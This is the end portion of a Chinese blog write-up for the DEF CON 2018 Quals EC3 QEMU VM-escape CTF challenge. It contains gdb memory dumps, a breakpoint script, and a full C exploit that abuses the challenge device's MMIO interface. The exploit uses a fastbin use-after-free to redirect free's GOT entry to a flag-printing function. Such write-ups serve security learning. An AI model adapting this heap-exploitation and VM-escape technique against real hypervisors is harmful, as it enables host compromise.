+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /12gx 0x1317940</span><br><span class="line">0x1317940:	0x00007fffc82a4550	0x00007fffc82a4310</span><br><span class="line">0x1317950:	0x000000000131798d	0x00007fffc829ae00</span><br><span class="line">0x1317960:	0x00007fffc81ecdd0	0x00007fffc81ecf50</span><br><span class="line">0x1317970:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1317980:	0x00007fffc82a43d0	0x0000000000000000</span><br><span class="line">0x1317990:	0x00000000011301a0	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>最终我通过改写free_got为cat flag后门函数，其实我就调用了一次free，可以看到qemu自己又free了两次。</p>
+<p><img src="http://pic.giantbranch.cn/pic/1578388583681.png" alt></p>
+<p>分享一下我调试的源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/qemu_escape/defcon-2018-ec3$ cat comline.txt</span><br><span class="line">bc</span><br><span class="line">#b *0x6E61F4</span><br><span class="line"># malloc</span><br><span class="line">b *0x6e629a</span><br><span class="line"># free</span><br><span class="line">b *0x6E62D1</span><br><span class="line"># edit</span><br><span class="line">b *0x6E6312</span><br><span class="line">run -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic \</span><br><span class="line">    -kernel ./vmlinuz-4.4.0-119-generic \</span><br><span class="line">    -append &quot;priority=low console=ttyS0&quot; -device ooo</span><br><span class="line">giantbranch@ubuntu:~/qemu_escape/defcon-2018-ec3$ sudo gdb -q ./qemu-system-x86_64</span><br><span class="line">pwndbg: loaded 176 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from ./qemu-system-x86_64...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ source comline.txt</span><br><span class="line">Breakpoint 1 at 0x6e629a</span><br><span class="line">Breakpoint 2 at 0x6e62d1</span><br><span class="line">Breakpoint 3 at 0x6e6312</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[New Thread 0x7fffd63c3700 (LWP 16385)]</span><br><span class="line">[New Thread 0x7fffd5bc2700 (LWP 16386)]</span><br><span class="line">[New Thread 0x7fffd53c1700 (LWP 16387)]</span><br><span class="line">[New Thread 0x7fffce7ff700 (LWP 16388)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SeaBIOS (version rel-1.11.1-0-g0551a4be2c-prebuilt.qemu-project.org)</span><br></pre></td></tr></table></figure>
+
+<p>最终exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">// -*- coding: utf-8 -*-</span><br><span class="line">// @Date    : 2020-01-07 10:09:50</span><br><span class="line">// @Author  : giantbranch</span><br><span class="line">// @Link    : http://www.giantbranch.cn/</span><br><span class="line">// @tags : </span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;ctype.h&gt;</span><br><span class="line">#include &lt;termios.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/io.h&gt;</span><br><span class="line"></span><br><span class="line">// #define MAP_SIZE 4096UL</span><br><span class="line">#define MAP_SIZE 0x1000000</span><br><span class="line">#define MAP_MASK (MAP_SIZE - 1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char* pci_device_name = &quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;;</span><br><span class="line"></span><br><span class="line">unsigned char* mmio_base;</span><br><span class="line"></span><br><span class="line">unsigned char* getMMIOBase()&#123;</span><br><span class="line">    </span><br><span class="line">    int fd;</span><br><span class="line">    if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) &#123;</span><br><span class="line">        perror(&quot;open pci device&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);</span><br><span class="line">    if(mmio_base == (void *) -1) &#123;</span><br><span class="line">        perror(&quot;mmap&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    return mmio_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mmio_write(uint64_t addr, uint64_t value, uint32_t size)</span><br><span class="line">&#123;</span><br><span class="line">    if (size == 1)</span><br><span class="line">    &#123;</span><br><span class="line">        *((uint8_t*)(mmio_base + addr)) = value;</span><br><span class="line">    &#125;else if (size == 2)</span><br><span class="line">    &#123;</span><br><span class="line">        *((uint16_t*)(mmio_base + addr)) = value;</span><br><span class="line">    &#125;else if (size == 4)</span><br><span class="line">    &#123;</span><br><span class="line">        *((uint32_t*)(mmio_base + addr)) = value;</span><br><span class="line">    &#125;else if (size == 8)</span><br><span class="line">    &#123;</span><br><span class="line">        *((uint64_t*)(mmio_base + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint32_t mmio_read(uint64_t addr)</span><br><span class="line">&#123;</span><br><span class="line">    return *((uint32_t*)(mmio_base + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ooo_malloc(uint32_t i, uint32_t malloc_size, uint32_t size)</span><br><span class="line">&#123;</span><br><span class="line">    mmio_write((i&lt;&lt;16)|(0&lt;&lt;20), malloc_size/8, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ooo_edit(uint32_t i, uint32_t offset, uint64_t value, uint32_t size)</span><br><span class="line">&#123;</span><br><span class="line">    mmio_write((i&lt;&lt;16)|(2&lt;&lt;20)|offset, value, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ooo_free(uint32_t i)</span><br><span class="line">&#123;</span><br><span class="line">    mmio_write((i&lt;&lt;16)|(1&lt;&lt;20), 0, 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t catflag_addr = 0x6E65F9;</span><br><span class="line"></span><br><span class="line">    getMMIOBase();</span><br><span class="line">    printf(&quot;mmio_base Resource0Base: %p\n&quot;, mmio_base);</span><br><span class="line"></span><br><span class="line">    //create fake size 7f</span><br><span class="line">    ooo_malloc(8, 0x60, 1);</span><br><span class="line"></span><br><span class="line">    //uaf: modify fd</span><br><span class="line">    ooo_malloc(0, 0x60, 1);</span><br><span class="line">    ooo_free(0);</span><br><span class="line">    ooo_edit(0, 0, 0x131797d, 8);</span><br><span class="line"></span><br><span class="line">    // try to get write access —— 0x131795d</span><br><span class="line">    int i = 0;</span><br><span class="line">    for (i = 0; i &lt; 6; i++)</span><br><span class="line">    &#123;   </span><br><span class="line">        ooo_malloc(i, 0x60, 1);</span><br><span class="line">    &#125;</span><br><span class="line">    // free_got = 0x11301A0</span><br><span class="line">    // malloc_got = 0x1130B78</span><br><span class="line">    // write free_got to gbuf_bss_1317940  </span><br><span class="line">    for (i = 0; i &lt; 6; i++)</span><br><span class="line">    &#123;   </span><br><span class="line">        ooo_edit(i, 0, 0x11301A0000000, 8);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ooo_edit(10, 0, catflag_addr, 8); // write free_got</span><br><span class="line">    ooo_free(0); // call free —— in fact call sub_6E65F9</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个没符号增加了难度，需要从字符串寻找线索，需要熟悉QOM(Qemu Object Model)的知识或者根据以往题目的对比才能像正常题目一样去做题</p>
+<p>实际是还是经典的fastbin attack的堆题目，好久没做ctf堆，有点生疏了，坑点就是qemu自身会malloc和free，导致你申请到的fake fd不固定</p>
+<p>还有一位大佬是通过write的时候，可以设置偏移（那个是<code>signed __int16</code>类型，所以可以写-32768到32768），这就相当于堆溢出了，他通过堆溢出，将cat flag后门函数的地址乱写一通，覆盖了一些函数指针，最后通过调用<code>system(&quot;echo mem &gt; /sys/power/state&quot;);</code>，这个是让机器睡眠，调用的一些函数被覆盖成了cat flag，还是挺神奇的。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/o-o-overflow/chall-ec-3" target="_blank" rel="noopener">https://github.com/o-o-overflow/chall-ec-3</a><br><a href="https://uaf.io/exploitation/2018/05/13/DefconQuals-2018-EC3.html" target="_blank" rel="noopener">https://uaf.io/exploitation/2018/05/13/DefconQuals-2018-EC3.html</a><br><a href="https://ray-cp.github.io/archivers/qemu-pwn-DefconQuals-2018-EC3" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/qemu-pwn-DefconQuals-2018-EC3</a><br><a href="https://blog.bushwhackers.ru/defconquals2018-ec3/" target="_blank" rel="noopener">https://blog.bushwhackers.ru/defconquals2018-ec3/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.giantbranch.cn/2020/01/06/CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3/" title="CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3">https://www.giantbranch.cn/2020/01/06/CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/qemu/" rel="tag"># qemu</a>
+          
+            <a href="/tags/vm-escape/" rel="tag"># vm escape</a>
+          
+            <a href="/tags/虚拟机逃逸/" rel="tag"># 虚拟机逃逸</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/05/QEMU 的一些基础知识及QOM(Qemu Object Model)的部分相关源码阅读/" rel="next" title="QEMU 的一些基础知识及QOM(Qemu Object Model)的部分相关源码阅读">
+                <i class="fa fa-chevron-left"></i> QEMU 的一些基础知识及QOM(Qemu Object Model)的部分相关源码阅读
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/08/CTF QEMU 虚拟机逃逸之XNUCA 2018 SSD/" rel="prev" title="CTF QEMU 虚拟机逃逸之XNUCA 2018 SSD">
+                CTF QEMU 虚拟机逃逸之XNUCA 2018 SSD <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">giantbranch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">201</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#熟悉题目"><span class="nav-number">1.</span> <span class="nav-text">熟悉题目</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#重点代码分析"><span class="nav-number">2.</span> <span class="nav-text">重点代码分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">giantbranch</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+<div class="footer-custom">
+<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
+<br>
+这是我的新博客，网站建于2017年10月
+<!-- <br>以下UV,PV统计始于2018.06.23 -->
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://www.giantbranch.cn/2020/01/06/CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3/';
+          this.page.identifier = '2020/01/06/CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3/';
+          this.page.title = 'CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://giantbranch.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
